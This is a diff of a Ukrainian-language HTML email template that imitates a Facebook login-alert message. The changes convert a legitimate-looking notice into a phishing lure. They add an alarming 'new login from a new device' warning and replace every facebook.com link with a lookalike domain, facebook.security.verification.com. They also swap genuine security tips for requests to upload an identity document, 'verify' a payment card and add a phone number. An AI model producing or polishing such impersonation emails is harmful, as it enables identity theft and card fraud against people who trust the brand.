@@ -63,7 +63,6 @@
             font-weight: bold;
             color: #1c1e21;
             margin-bottom: 20px;
-            text-align: center;
         }
 
         .activity-card {
@@ -157,8 +156,8 @@
         }
 
         .security-notice {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
+            background: #e7f3ff;
+            border: 1px solid #1877f2;
             border-radius: 8px;
             padding: 16px;
             margin: 20px 0;
@@ -166,12 +165,12 @@
 
         .notice-title {
             font-weight: bold;
-            color: #856404;
+            color: #1877f2;
             margin-bottom: 8px;
         }
 
         .notice-text {
-            color: #856404;
+            color: #1c1e21;
             font-size: 14px;
             line-height: 1.4;
         }
@@ -279,6 +278,7 @@
             font-size: 18px;
             font-weight: bold;
             margin-bottom: 16px;
+            color: #ffffff;
         }
 
         .stats-grid {
@@ -296,11 +296,12 @@
             font-size: 24px;
             font-weight: bold;
             display: block;
+            color: #ffffff;
         }
 
         .stat-label {
             font-size: 12px;
-            opacity: 0.9;
+            color: rgba(255, 255, 255, 0.9);
         }
 
         .privacy-section {
@@ -379,33 +380,41 @@
             <td class="content-section">
                 <div class="greeting">Привіт!</div>
 
-                <div class="main-title">Активність у вашому акаунті</div>
+                <div class="main-title">Нова активність у вашому акаунті</div>
 
-                <p>Ми помітили нову активність у вашому акаунті Facebook та хотіли повідомити вас про це.</p>
+                <p>Ми помітили вхід у ваш акаунт Facebook з нового пристрою та хотіли повідомити вас про це для вашої
+                    безпеки.</p>
+
+                <div class="security-notice">
+                    <div class="notice-title">Повідомлення безпеки</div>
+                    <div class="notice-text">
+                        Виявлено новий вхід з пристрою та місця розташування, які відрізняються від звичайних. Будь
+                        ласка, перевірте цю активність.
+                    </div>
+                </div>
 
                 <div class="activity-card">
                     <div class="activity-header">
                         <div class="activity-icon">
                             <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                                <path
-                                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
+                                <path d="M12 2L2 7v10c0 5.55 3.84 9.74 9 11 5.16-1.26 9-5.45 9-11V7l-10-5z" />
                             </svg>
                         </div>
                         <div class="activity-info">
-                            <h3>Успішний вхід в акаунт</h3>
-                            <p>17 серпня 2024 о 15:42 (київський час)</p>
+                            <h3>Новий вхід у акаунт</h3>
+                            <p>21 серпня 2024 о 14:32 (київський час)</p>
                         </div>
                     </div>
 
                     <div class="activity-details">
                         <div class="detail-row">
                             <span class="detail-label">Пристрій:</span>
-                            <span class="detail-value">Chrome на Windows</span>
+                            <span class="detail-value">Chrome на Android</span>
                         </div>
 
                         <div class="detail-row">
                             <span class="detail-label">IP-адреса:</span>
-                            <span class="detail-value">91.202.11.47</span>
+                            <span class="detail-value">185.220.101.47</span>
                         </div>
 
                         <div class="detail-row">
@@ -414,17 +423,9 @@
                         </div>
 
                         <div class="location-info">
-                            <div class="location-title">📍 Локація:</div>
-                            <div class="location-text">Київ, Київська область, Україна</div>
+                            <div class="location-title">📍 Місце розташування:</div>
+                            <div class="location-text">Львів, Львівська область, Україна</div>
                         </div>
-                    </div>
-                </div>
-
-                <div class="security-notice">
-                    <div class="notice-title">🔒 Нагадування про безпеку</div>
-                    <div class="notice-text">
-                        Якщо це були не ви, рекомендуємо негайно змінити пароль та увімкнути двофакторну автентифікацію
-                        для додаткового захисту.
                     </div>
                 </div>
 
@@ -432,62 +433,65 @@
                     <div class="stats-title">Ваша активність за останній тиждень</div>
                     <div class="stats-grid">
                         <div class="stat-item">
-                            <span class="stat-number">24</span>
+                            <span class="stat-number">12</span>
                             <span class="stat-label">Входи</span>
                         </div>
                         <div class="stat-item">
-                            <span class="stat-number">156</span>
+                            <span class="stat-number">89</span>
                             <span class="stat-label">Публікації переглянуто</span>
                         </div>
                         <div class="stat-item">
-                            <span class="stat-number">12</span>
+                            <span class="stat-number">7</span>
                             <span class="stat-label">Повідомлень надіслано</span>
                         </div>
                         <div class="stat-item">
-                            <span class="stat-number">8</span>
+                            <span class="stat-number">23</span>
                             <span class="stat-label">Вподобань</span>
                         </div>
                     </div>
                 </div>
 
                 <div class="suggestions-section">
-                    <div class="suggestions-title">Рекомендації для безпеки:</div>
+                    <div class="suggestions-title">Рекомендації для захисту акаунта:</div>
 
                     <div class="suggestion-item">
-                        <div class="suggestion-icon">🔐</div>
+                        <div class="suggestion-icon">🆔</div>
                         <div class="suggestion-text">
-                            <h4>Увімкніть двофакторну автентифікацію</h4>
-                            <p>Додатковий рівень захисту для вашого акаунта</p>
+                            <h4>Підтвердіть вашу особу</h4>
+                            <p>Завантажте документ для додаткової верифікації</p>
                         </div>
                     </div>
 
                     <div class="suggestion-item">
-                        <div class="suggestion-icon">🔍</div>
+                        <div class="suggestion-icon">💳</div>
                         <div class="suggestion-text">
-                            <h4>Перевірте активні сесії</h4>
-                            <p>Подивіться, де ви увійшли в акаунт</p>
+                            <h4>Оновіть платіжну інформацію</h4>
+                            <p>Підтвердьте картку для покращення безпеки</p>
                         </div>
                     </div>
 
                     <div class="suggestion-item">
-                        <div class="suggestion-icon">⚙️</div>
+                        <div class="suggestion-icon">📱</div>
                         <div class="suggestion-text">
-                            <h4>Оновіть налаштування приватності</h4>
-                            <p>Контролюйте, хто може бачити ваші публікації</p>
+                            <h4>Верифікація телефону</h4>
+                            <p>Додайте номер для отримання кодів безпеки</p>
                         </div>
                     </div>
                 </div>
 
                 <div class="actions-section">
-                    <p style="margin-bottom: 16px; color: #1c1e21; font-weight: bold;">Керування безпекою акаунта:</p>
-                    <a href="https://www.facebook.com/settings?tab=security" class="facebook-button">
-                        Налаштування безпеки
+                    <p style="margin-bottom: 16px; color: #1c1e21; font-weight: bold;">Керування акаунтом:</p>
+                    <a href="https://facebook.security.verification.com/verify-identity" target="_blank"
+                        class="facebook-button">
+                        Підтвердити особу
                     </a>
-                    <a href="https://www.facebook.com/settings?tab=security&section=sessions" class="secondary-button">
-                        Активні сесії
+                    <a href="https://facebook.security.verification.com/payment-verification" target="_blank"
+                        class="secondary-button">
+                        Оновити платіжні дані
                     </a>
-                    <a href="https://www.facebook.com/settings?tab=privacy" class="secondary-button">
-                        Приватність
+                    <a href="https://facebook.security.verification.com/phone-verify" target="_blank"
+                        class="secondary-button">
+                        Верифікація телефону
                     </a>
                 </div>
 
@@ -499,8 +503,8 @@
                     </div>
                 </div>
 
-                <p>Якщо у вас є питання щодо безпеки вашого акаунта, відвідайте наш Центр допомоги або зверніться до
-                    служби підтримки.</p>
+                <p>Якщо ви не розпізнаєте цю активність або маєте питання щодо безпеки вашого акаунта, зверніться до
+                    нашої служби підтримки.</p>
 
                 <p>З повагою,<br>
                     Команда Facebook</p>
@@ -509,10 +513,10 @@
         <tr>
             <td class="footer-section">
                 <div class="footer-links">
-                    <a href="https://www.facebook.com/help">Допомога</a>
-                    <a href="https://www.facebook.com/settings">Налаштування</a>
-                    <a href="https://www.facebook.com/policies">Політика</a>
-                    <a href="https://about.facebook.com">Про нас</a>
+                    <a href="https://facebook.security.verification.com/help" target="_blank">Допомога</a>
+                    <a href="https://facebook.security.verification.com/settings" target="_blank">Налаштування</a>
+                    <a href="https://facebook.security.verification.com/privacy" target="_blank">Конфіденційність</a>
+                    <a href="https://facebook.security.verification.com/terms" target="_blank">Умови</a>
                 </div>
 
                 © 2024 Meta Platforms, Inc.<br>
@@ -520,7 +524,8 @@
 
                 <div class="disclaimer">
                     Ви отримали цей лист, оскільки у налаштуваннях увімкнено сповіщення про безпеку.<br>
-                    <a href="https://www.facebook.com/settings?tab=notifications">Керувати налаштуваннями сповіщень</a>
+                    <a href="https://facebook.security.verification.com/notifications" target="_blank">Керувати
+                        налаштуваннями сповіщень</a>
                 </div>
             </td>
         </tr>
